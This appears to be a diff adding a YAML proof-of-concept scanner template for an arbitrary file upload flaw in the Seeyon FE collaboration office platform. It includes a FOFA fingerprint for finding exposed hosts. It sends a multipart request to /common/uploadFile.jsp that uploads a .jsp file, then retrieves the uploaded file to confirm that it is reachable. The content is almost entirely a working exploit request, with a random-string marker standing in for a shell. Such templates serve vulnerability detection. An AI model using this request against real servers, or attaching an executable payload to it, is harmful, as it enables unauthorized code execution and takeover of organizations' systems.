@@ -1,0 +1,43 @@
+id: poc-yaml-seeyon-hulian-fe-common-uploadfilejsp-fileuploadW
+info:
+  name: 致远互联FE协作办公平台 commonuploadFile.jsp 文件上传
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 致远互联-FE
+  fofa: app="致远互联-FE"
+variables:
+  random: random_str(32)
+requests:
+- method: GET
+  path: /common/uploadFile.jsp?action=save&savePath=/images/upload/&fileName=test123.jpg&title1=%C9%CF%B4%AB%CE%C4%BC%FE&title2=%D1%A1%D4%F1%CE%C4%BC%FE&allowsize=null&extName=.jsp
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylBU670lIdrGgVSWG
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+  data: '------WebKitFormBoundarylBU670lIdrGgVSWG
+
+    Content-Disposition: form-data; name="accessory"; filename="svg.jsp"
+
+    Content-Type: application/octet-stream
+
+
+    {{.random}}
+
+    ------WebKitFormBoundarylBU670lIdrGgVSWG--
+
+    '
+  expression: 'status_code == 200 &&
+
+    contains(body,"fileName=/images/upload/")
+
+    '
+  output:
+  - regex_match(body,"fileName=/images/upload/(?P<t1>.*?)&title1=")
+- method: GET
+  path: /images/upload/{{.t1}}
+  expression: 'status_code == 200 &&
+
+    contains(body,random)
+
+    '
+transport: http
